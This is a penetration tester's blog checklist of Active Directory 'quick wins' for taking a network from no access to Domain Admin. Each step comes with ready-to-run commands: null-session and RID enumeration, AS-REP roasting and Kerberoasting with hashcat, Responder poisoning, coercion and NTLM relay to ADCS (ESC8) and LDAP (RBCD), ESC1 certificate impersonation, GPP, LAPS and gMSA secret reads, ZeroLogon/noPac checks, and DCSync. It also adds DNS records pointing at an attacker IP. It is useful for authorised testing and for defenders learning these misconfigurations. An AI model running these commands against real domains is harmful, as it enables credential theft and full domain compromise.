---
title: " Active Directory Pentesting (Quick Wins) "
date: 2026-10-25 00:00:00 +0000
categories: [Methodology & Cheat Sheets]
tags: [Methodology, Cheat Sheet, Active Directory, Pentesting]
---





## Introduction : 

This is a quick checklist to follow whenever you're attacking an AD box or environment. It lists the quick wins, the checks and attacks that can take us from minimal access to full domain compromise with little effort.

It's not a full AD methodology, it's focused on the fast wins. But instead of just dumping commands, I've tried to briefly explain why each one works what causes the vulnerability or misconfiguration to exist in the first place, and what attack path it opens. That's the part that actually lets you recognize these in the wild instead of blindly copy-pasting.

The flow is simple: first we go from no access to at least a domain user, then from a domain user to full domain compromise. And if none of the quick wins land, the last section points toward the longer road.


## Check List : 

### Users Enumeration : 

#### Anonymous / Null & Guest access

 Legacy SMB and LDAP allow a null session a connection with an empty username and password. It dates back to NT4, where machines needed to query each other for user and share lists before authenticating. Modern Windows restricts it (RestrictAnonymous), but it's still enabled in plenty of environments for backwards compatibility.
 
 The Guest account is a separate case: a built-in, password-less account that's supposed to be disabled but often isn't.

 ```bash
# Shares :
nxc smb 10.10.10.0/24 -u '' -p '' --shares
nxc smb 10.10.10.0/24 -u 'guest' -p '' --shares

# Users : 
nxc ldap $DC -u '' -p '' --users
nxc smb $DC -u '' -p '' --users
nxc smb $DC -u '' -p '' --users | awk '{print $5}' | grep -vE '^\[|^-|^$' | tee users.txt (keep users only)
nxc ldap $DC -u 'guest' -p '' --users
nxc smb $DC -u 'guest' -p '' --users
```

#### RID cycling 

Every domain object has a SID ending in a RID (relative identifier). Users and groups are assigned RIDs sequentially from a known base (500 = Administrator, 512 = Domain Admins, regular users start at 1000). If the DC lets us resolve a SID name over a null/guest session, we can just count upward and recover every account, even when direct user enumeration is blocked.

```bash
nxc smb $DC -u '' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee users.txt (keep users only) 
``` 

#### RPC 

Same root cause as null sessions, different pipe. rpcclient talks to the MS-RPC interface (\srvsvc, \samr) over SMB. If anonymous access to the SAM-R interface is allowed, enumdomusers dumps the user list directly from the account database.

```bash
rpcclient -U "" -N $dc
> enumdomusers
``` 

#### AS-REP Roasting (Less Likely but worth checking)  

Kerberos pre-authentication is what normally stops us from requesting tickets for accounts we don't own. But any account with the "Do not require Kerberos preauthentication" flag (DONT_REQ_PREAUTH) set will hand out an AS-REP encrypted with that user's password hash to anyone who asks, no credentials needed. We take the users we just enumerated, ask the DC for each one, and crack whatever comes back offline.

```bash
# No creds needed just the user list we built above:
GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.hash
nxc ldap $DC -u $USER -p $PASS --asreproast hashes

# Crack it (AS-REP = mode 18200):
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
``` 

#### Pre2k (pre-Windows 2000 computer accounts)

A computer account can be created in AD before the real machine joins the domain this is called pre-staging (used for bulk imaging, delegated joins, or the old "pre–Windows 2000 computer" option). When an account is pre-staged, AD seeds it with a predictable default password:

- password = SAMAccountName, lowercased, trailing $ removed, truncated to 14 chars

So WEBSRV01$ ==> websrv01.

That default is only meant to survive until the machine joins and rotates it to a random secret. But if the account is pre-staged and never used, the password never changes handing us valid credentials for a domain machine account with zero prior access. The tell-tale sign is logonCount = 0 (never authenticated ==> still the default).

A machine account isn't Domain Admin, but it's a real foothold: enough to authenticate over LDAP/SMB, run BloodHound, Kerberoast, and feed into delegation/ADCS attacks.

```bash
# https://github.com/garrettfoster13/pre2k

# Unauthenticated spray (you supply the candidate computer list):
pre2k unauth -d $DOMAIN -dc-ip $DC -inputfile computers.txt

# Authenticated (nxc module needs creds; it finds candidates for us):
nxc ldap $DC -u '$USER' -p '$PASS' -M pre2k
```

#### Kerberos User Enumeration

Before Kerberos pre-authentication happens, the DC responds differently to a request for a valid username versus an invalid one (KDC_ERR_C_PRINCIPAL_UNKNOWN vs. a pre-auth required / TGT reply). That difference leaks which usernames exist and because it happens before authentication, a bad username never increments the lockout counter. Safe, fast user enumeration.

```bash
kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**Responder (LLMNR / NBT-NS / mDNS poisoning)** 

 When Windows fails to resolve a hostname via DNS, it falls back to broadcast protocols, LLMNR, NBT-NS, mDNS asking the whole local segment "who is \\fileservr?" (note the typo a mistyped share, a dead DNS entry, anything). These protocols have no authentication, so we simply answer "that's me," and the victim hands over its NetNTLM hash trying to authenticate to us.

```bash
sudo responder -I tun0
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Quick Terminology : NTLM vs NetNTLM 

The name "NTLM" gets reused for two totally different things, which is why it's so confusing. Let's split them:

- The NT hash (what everyone sloppily calls "the NTLM hash") is a stored secret MD4(password) , Found in the local SAM or the domain's NTDS.dit. It never changes unless the password does, and it's the thing we Pass-the-Hash with: we authenticate as the user without ever knowing their plaintext. Hashcat mode 1000.

A note on the LM hash. Dumped hashes show up in the format LM:NT two hashes separated by a colon. The LM (LAN Manager) hash is the legacy algorithm Windows used before Vista; it's extremely weak (it uppercases the password and splits it into two 7-character halves), so it cracks almost instantly. Modern Windows no longer stores it. When it isn't stored, Windows fills the field with a fixed placeholder aad3b435b51404eeaad3b435b51404ee , which is just the LM hash of a blank password. So whenever we see that exact value on the left of the colon, it means "no LM hash here" and we only care about the NT hash on the right.

- NetNTLMv1 / NetNTLMv2 is a completely different thing : it's the over-the-wire challenge-response that happens when a client proves it knows the password to a server. This is what Responder and NTLM relaying capture a one-time handshake, not a stored hash. Hashcat modes 5500 (v1) and 5600 (v2).

The distinction that actually matters on an engagement:

- NT hash --> we can replay it (Pass-the-Hash). Stored secret, works until the password changes.
- NetNTLM --> we can only crack it or relay it. We crack it to recover the plaintext password, or we relay the handshake straight to another server to authenticate as the victim. We cannot Pass-the-Hash a NetNTLM blob it's a proof, not a key.

One exception worth remembering: NetNTLMv1 is DES-based with a predictable challenge, so we can crack it back into the actual NT hash (via crack.sh) and that NT hash we can Pass-the-Hash. So if we ever catch v1 on the wire, it's a bigger prize than v2.

TLDR : NT hash = stored, replayable (PtH, 1000). NetNTLMv1/v2 = network proof, crack-or-relay only (5500/5600). Same name, totally different beasts.



### Security Misconfigurations : 

These are domain/host settings that, when left at insecure defaults, open the door to the attacks in the next section. We're checking presence here the exploitation comes later.

#### SMB Signing not required

If SMB signing isn't enforced, a captured authentication can be forwarded to another host and executed as that user it's the core requirement for SMB relay. --> Attacks: NTLM Relay.

```bash
# List every host where signing is NOT required (our relay targets):
nxc smb 10.10.10.0/24 -u $USER -p $PASS --gen-relay-list targets.txt
``` 

#### SMBv1 Enabled

A legacy, unsigned-by-default protocol. Its presence usually means the host is old/unpatched and exposes the MS17-010 (EternalBlue) remote code execution surface. --> Attacks: EternalBlue for example. 

```bash
nmap -p445 --script smb-protocols $TARGET
```

#### LDAP Signing & Channel Binding not enforced 

These are the LDAP equivalent of SMB signing. If they're off, we can relay authentication to the DC's LDAP/LDAPS service and write to the directory , most commonly to configure RBCD or push an ADCS attack. --> Attacks: NTLM Relay --> LDAP

```bash
nxc ldap $DC -u $USER -p $PASS -M ldap-checker
```

#### MachineAccountQuota = 10 (default)

This default lets any domain user create up to 10 computer accounts. An attacker-controlled machine account is the missing ingredient for RBCD and noPac. --> Attacks: RBCD, noPac

```bash
nxc ldap $DC -u $USER -p $PASS -M maq
```

#### WebClient (WebDAV) service running

This isn't a vulnerability by itself WebClient is a legitimate Windows service. But if it's running, we can coerce the host into authenticating to us over HTTP instead of SMB, and an HTTP authentication is relayable to targets that SMB can't reach most importantly the ADCS Web Enrollment endpoint, which is the ESC8 attack. --> Attacks: ESC8

```bash
nxc smb 10.10.10.0/24 -u $USER -p $PASS -M webdav
```

What's **ESC8?** ADCS can expose a Web Enrollment interface (http://<ca>/certsrv) that accepts NTLM authentication over HTTP and, by default, has no channel binding protecting it. In ESC8, we coerce a privileged machine typically a Domain Controller into authenticating to us (the WebDAV/HTTP trigger is why WebClient matters), then relay that authentication to the CA's web enrollment endpoint and request a certificate on the DC's behalf. With a certificate for the DC's machine account, we can authenticate as that DC and DCSync the domain. Coercion + a relayable HTTP auth + an unprotected enrollment endpoint = Domain Admin.

#### Authentication coercion surfaces

Relay is only useful if we can force a victim (ideally a DC) to authenticate to us. The classic triggers are the Print Spooler (PrinterBug), MS-EFSRPC (PetitPotam), and DFS (DFSCoerce). --> Attacks: Coercion + Relay

```bash
nxc smb $TARGETS -u $USER -p $PASS -M spooler        # Spooler reachable?
nxc smb $TARGETS -u $USER -p $PASS -M coerce_plus    # PetitPotam / DFSCoerce / others
```

#### ADCS vulnerable templates / Web Enrollment 

A misconfigured Certificate Authority is one of the fastest paths to Domain Admin. Certipy triages every known template/endpoint issue (ESC1–ESC16) in one pass. --> Attacks: ADCS (ESC1, ESC8, …)

```bash
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
```


#### Authenticated users can add DNS records (ADIDNS)

This isn't a vulnerability on its own it's a default permission. In AD-Integrated DNS, authenticated users can create new DNS records in the zone by default. On its own it does nothing, but it's a powerful chaining primitive:

- ADIDNS spoofing : we add a wildcard (*) record pointing at our host, so any failed name lookup domain-wide resolves to us. It's LLMNR/NBT-NS poisoning but at the DNS layer it works across subnets, not just the local segment, and it's quieter. Captured NetNTLM --> crack or relay.
- WPAD injection : if no wpad record exists, we add one pointing to us --> we proxy victims' web traffic and harvest credentials.
- Relay/coercion support : we give our attacker host a legitimate in-domain name, which satisfies the DNS/SPN requirements some relay and Kerberos-based attacks need.

```bash
# Add a record pointing a name at us (dnstool.py — from krbrelayx):
python3 dnstool.py -u 'DOMAIN\$USER' -p '$PASS' -a add -r attacker.$DOMAIN -d $ATTACKER_IP $DC

# Wildcard record for domain-wide spoofing:
python3 dnstool.py -u 'DOMAIN\$USER' -p '$PASS' -a add -r '*' -d $ATTACKER_IP $DC
```

**To Note** : ADIDNS spoofing is more of a credential harvesting / relay enabler than an instant-DA button it belongs in Misconfigurations (chainable primitive), not in the "instant DA" Tier A. It leads to the relay/coercion wins rather than being one itself.


### Known CVEs (nxc sweep) :

Modern domains are usually patched against these, so they rarely hit on a mature network, but we can always check for these CVEs , you never know :) 

```bash
# One-shot sweep — checks the host against a batch of known CVEs:
nxc smb $DC -u $USER -p $PASS -M enum_cve
```

If something flags, you can pull in the dedicated module to dig deeper or exploit:

```bash
nxc smb $DC      -u $USER -p $PASS -M zerologon       # CVE-2020-1472 reset DC machine pwd -> DCSync -> DA
nxc smb $DC      -u $USER -p $PASS -M nopac           # CVE-2021-42278/42287 any user (+MAQ) -> DC SYSTEM
nxc smb $DC      -u $USER -p $PASS -M petitpotam      # CVE-2021-36942 coerce DC auth -> relay (ESC8/LDAP)
nxc smb $TARGETS -u $USER -p $PASS -M printnightmare  # CVE-2021-34527 RCE as SYSTEM
nxc smb $TARGETS -u '' -p ''       -M ms17-010        # MS17-010 (EternalBlue) RCE as SYSTEM
```

What we get: depends on the hit, ZeroLogon/noPac go straight to DC compromise, PetitPotam feeds our relay/ESC8 path, PrintNightmare/EternalBlue give SYSTEM on an unpatched host.

**Note:** enum_cve and most of these are detection modules, a positive result means **vulnerable**, and you then point the real exploit at it. Be especially careful with ZeroLogon: the full exploit can break the DC's secure channel if run carelessly.


### Attack Section : 

#### Coercion + NTLM Relay

The idea is simple , We force a privileged machine (ideally a DC) to authenticate to us, catch that NetNTLM authentication, and immediately relay it to a service that can't tell it didn't come from the real victim possible because signing/channel-binding is off (relay to SMB/LDAP) or the endpoint is plain HTTP (relay to ADCS). Two targets are worth your time:

##### Path A — Relay to ADCS Web Enrollment (ESC8) --> DC cert --> DCSync

```bash
# 1/ Set up the relay server , pointed at the CA's web enrollment, asking for a DC cert:
certipy relay -target 'http://<CA_HOST>' -template DomainController

# Or use Impacket : 
ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2/ Coerce the DC to authenticate to us over HTTP (needs WebClient running on the DC):
coercer coerce -u $USER -p $PASS -d $DOMAIN -t <DC_IP> -l <ATTACKER_HOST> --filter webdav

# Or use PetitPotam, forcing the WebDAV/HTTP path :
PetitPotam.py -u $USER -p $PASS -d $DOMAIN <ATTACKER_HOST@80/x> <DC_IP>

# 3/ Use the captured DC certificate to authenticate, then dump the domain:
certipy auth -pfx 'dc.pfx' -dc-ip $DC
secretsdump.py -k -no-pass <DC_FQDN>
```

##### Path B --> Relay to LDAP --> RBCD on the DC

```bash
# Relay to LDAPS and auto-configure RBCD using a machine account we control:
ntlmrelayx.py -t ldaps://$DC --delegate-access --escalate-user '<OUR_COMPUTER>$' -smb2support

# then coerce the DC (step 2 above), and finally request a ticket as DA via S4U:
getST.py -spn 'cifs/<DC_FQDN>' -impersonate Administrator -dc-ip $DC '$DOMAIN/<OUR_COMPUTER>$:<PASS>'
```
**What we get:** either a certificate (Path A) or a Kerberos ticket (Path B) that lets us authenticate as the Domain Controller / Domain Admin --> full domain compromise via DCSync.

**Why the preconditions matter:** this is where the Misconfig section cashes out , ESC8 needs WebClient running (HTTP coercion) + unprotected web enrollment. The LDAP path needs LDAP signing/channel binding off, and if the DC's WebClient name needs to resolve to us, that's where ADIDNS comes in. All four arrows land here.


#### ADCS :ESC1 

ESC1 works when four things line up on a certificate template:

- We're allowed to enroll. Every template has a permission list for who can request a certificate from it. ESC1 is only useful to us if that list includes a group we're already in usually Domain Users or Authenticated Users. This is the "the door is open to us" condition.

- The enrollee supplies the subject (ENROLLEE_SUPPLIES_SUBJECT). Normally the CA decides whose identity goes in the certificate, it looks up our account and bakes our name in. This flag flips that, letting the requester choose the identity. That's the dangerous part : it's what lets us say "issue this cert in the name of administrator" instead of our own.

- The cert can be used to log in (Client Authentication EKU). A certificate's EKU defines what it's allowed to do. For this attack the template must allow authentication Client Authentication, Smart Card Logon, PKINIT, or Any Purpose. Without it, a cert with administrator's name on it still can't be used to log in as administrator.

- No manager approval. The template must issue certificates instantly, with no approval step. If a human had to sign off, our obvious "I'd like to be administrator" request would just get denied.
  
When all four line up, we ask for a certificate as administrator, the CA hands it over without question, and we authenticate as a Domain Admin.

- certipy find already flagged the vulnerable template in the Misconfig section.

```bash
# Request a cert, impersonating a DA through the SAN (-upn):
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca <CA_NAME> -template <VULN_TEMPLATE> -upn administrator@$DOMAIN

# Authenticate with that cert → we get the DA's TGT and NT hash (UnPAC-the-hash):
certipy auth -pfx administrator.pfx -dc-ip $DC
```

**What we get:** a Kerberos TGT and the NT hash for the account we named in the SAN (e.g. Administrator). From there it's a straight DCSync / Pass-the-Hash --> full domain compromise.

- ESC1 vs ESC8: same end goal (a cert for a privileged identity), different trigger. ESC1 = we enroll directly because the template lets us pick the subject. ESC8 = we can't enroll as a privileged user, so we relay a coerced DC's authentication to the web enrollment endpoint instead. ESC1 is usually the faster, quieter win when it's present.

#### Kerberoasting 

Any account with a Service Principal Name (SPN) registered is a service account and Kerberos lets any authenticated domain user request a service ticket (TGS) for any SPN. That's by design: it's how clients get tickets to talk to services. The catch is that the ticket is encrypted with the service account's password hash, so once we have the ticket, we can take it offline and brute-force it back to the plaintext password. No special rights needed just a valid domain user.

The reason this works so often is human behavior: service accounts tend to have old, manually-set passwords that rarely rotate, and they're frequently over-privileged (SQL/service accounts dropped into Domain Admins or given broad rights). Weak password + high privilege = instant win.

```bash
# Request TGS tickets for every SPN account:
GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb.hash

# Or use nxc equivalent :
nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.hash

# Crack it (Kerberoast = mode 13100):
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
```

**What we get:** the cleartext password of a service account. If that account is privileged, it's a direct path to DA; if not, it's still valid creds for lateral movement and further enumeration.

**Realistic note:** this is a "quick win" only if the roasted account both cracks and is privileged so prioritize. GetUserSPNs.py shows each account's group membership; go after the ones sitting in Domain Admins or other high-value groups first, and don't waste hours cracking a low-priv service account that gets you nothing.


#### GPP cpassword (Group Policy Preferences) 

Group Policy Preferences let admins push settings to machines including things like setting a local admin password, mapped drives, or scheduled tasks, all with credentials embedded in the policy. Those credentials get stored in XML files in SYSVOL, which every authenticated user can read. Microsoft "encrypted" the password field (cpassword) with AES-256, but then published the static AES key on MSDN, so anyone can decrypt it. The encryption is effectively useless :)

**So the win is:** read the XML out of SYSVOL, decrypt the cpassword with the public key, and you've got a cleartext credential, very often a local admin password that was pushed to every machine in an OU, which means local admin everywhere + instant lateral movement.

```bash
# nxc hunts SYSVOL and decrypts automatically:
nxc smb $DC -u $USER -p $PASS -M gpp_password
nxc smb $DC -u $USER -p $PASS -M gpp_autologin   # also grabs autologon creds from registry.xml

# Manual: pull the blob from the XML, then:
gpp-decrypt '<cpassword_blob>'
```

**What we get:** a cleartext credential, usually a local admin account reused across many hosts, straight to lateral movement, and sometimes a privileged domain account.

**Realistic note:** this is a bit rare. There was a patch apparently (MS14-025) in 2014 that stopped admins from creating new GPP passwords, but it never removed the ones already sitting in SYSVOL, so you only find this in old or long-lived domains. But still we can always check it . 


#### Readable LAPS / gMSA 

These two are basically the same thing: AD stores a sensitive credential, and the only thing protecting it is an ACL that admins sometimes over-delegate. If the ACL happens to include a group we're in, we just read the secret straight out of the directory, no cracking, no relaying.

**LAPS**

LAPS gives every domain joined machine its own random local Administrator password (so one cracked local admin can't unlock every box). 

**The catch:** it keeps a cleartext copy of each machine's password in AD, on that computer's object, so admins can look it up when they need to log in. 

That copy is protected by an ACL, and the common misconfig is over-delegation: a helpdesk group or "Authenticated Users" ends up able to read it. If our user is in that group, we just query AD and get the machine's local admin password handed to us.

```bash
# Read every LAPS password our user is allowed to see:
nxc ldap $DC -u $USER -p $PASS -M laps
```

**What we get:** the cleartext local admin password --> local admin on that host --> dump SAM/LSASS --> lateral movement.

**gMSA** 

For this one , it's better to explain it with an example, since that's how i understood it better : 

Let's imagine a A company runs an internal web app on three load-balanced servers, WEB01, WEB02, WEB03. The app needs to talk to a SQL database and read from a file share, so it can't just run as "nobody", it needs to run under a domain identity that has permission to those resources.

***The old, painful way (plain service account):*** 
An admin creates a normal domain user, svc_intranet, gives it a password , and configures all three web servers to run the app as svc_intranet using that password. Now:
- The password is typed into three servers and written down somewhere.
- Rotating it means updating it in three places, so in practice nobody ever changes it, it's the same in 2026 as the day it was set.
- It's a weak, human-chosen password --> Kerberoastable, and we crack it in minutes. (This is exactly the Kerberoasting win from earlier.)

***The gMSA way:***
The admin instead creates a gMSA, svc_intranet$, and tells AD "WEB01, WEB02, and WEB03 are allowed to use this account." Now:
- AD generates a random ~240-character password and rotates it automatically every 30 days.
- Each of the three web servers pulls the current password from AD on its own to run the app, no human ever knows it or types it.
- Because it's random and auto-rotating, it's not crackable and not Kerberoastable.

So the three servers share the one svc_intranet$ identity, and AD handles the password for them. That's the whole idea: **one managed account**, a **group of servers** using it, zero manual password handling.

**The Weakness:** That "allowed to use this account" list is just an ACL. If an admin sets it too broadly, say it includes a group we're in, not just WEB01-03, then we can pull svc_intranet$'s password too. 

We become svc_intranet$, and inherit whatever it can reach (that SQL database, that file share, or more if it's over-privileged).

```bash
# Query the DC (the LDAP server) for the gMSA passwords we're allowed to retrieve, then we can login as that service : 
nxc ldap $DC -u $USER -p $PASS --gmsa

# Or we can use gMSADumper: 
python3 gMSADumper.py -u $USER -p $PASS -d $DOMAIN
```

So the difference between the two : 
- LAPS --> we read another machine's local admin password --> we then log into that machine.
- gMSA --> we read a domain account's own password --> we are that account immediately (Pass-the-Hash).


### If No Quick Wins are there :

If you've worked through everything above and still don't have DA, that's normal, it just means the environment isn't trivially broken, and the real work begins. This is where the quick-win checklist ends and a full methodology takes over, so I'll keep it to the shape of the approach, not the details:

#### 1/ Collect BloodHound and hunt ACL paths :

Run SharpHound / bloodhound-python, nxc can collect as well, then look for the chains: GenericAll, WriteDACL, GenericWrite, ForceChangePassword, AddMember, delegation (unconstrained / constrained / RBCD), nested group memberships, and the shortest path from a principal we control to Domain Admin.

```bash
bloodhound-python -u $USER -p $PASS -d $DOMAIN -dc $DC -c All --zip
nxc ldap $target -u '$USER' -p '$PASS' --bloodhound --collection All --dns-server $DC 
```

#### 2/ Authenticate --> Admin --> Dumps  : 

Use any creds or hashes we've gathered to find a host where we're local admin, authenticate, and dump everything, SAM, LSA secrets, LSASS, cached domain creds, DPAPI.

#### Move laterally and repeat : 

Move laterally and repeat. Reuse those creds (Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash), hunt for privileged sessions to steal tokens, and keep pivoting, each new host usually gives us more credentials that get us closer to DA.

The loop is always the same: **enumerate --> find a privilege or credential --> use it --> land on a new host --> enumerate again --> until a path to Domain Admin opens up**. The specifics of ACL abuse, delegation, and credential dumping are each a post of their own, out of scope for a quick-wins checklist, but the natural next read once the easy wins are exhausted.



That's all for this checklist :) 


  
